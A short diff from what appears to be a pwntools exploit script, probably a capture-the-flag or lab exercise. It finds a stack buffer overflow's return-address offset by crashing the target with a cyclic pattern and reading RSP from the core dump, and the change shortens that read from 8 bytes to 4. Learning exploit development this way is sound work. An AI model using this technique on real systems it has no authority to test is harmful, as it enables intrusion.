@@ -118,7 +118,7 @@ payload = cyclic(200)
 p.sendline(payload)
 p.wait()  # waiting for the program to crash, and produce the core dump
 core = p.corefile # loading the crash dump, from which we will read the content of RSP after crashing
-offset = cyclic_find(core.read(core.rsp, 8))
+offset = cyclic_find(core.read(core.rsp, 4))
 # Here we're using cyclic to extract the offset from RSP, which points to our overwritten RIP.
 log.success(f"Offset found: {offset}")
 p.close()
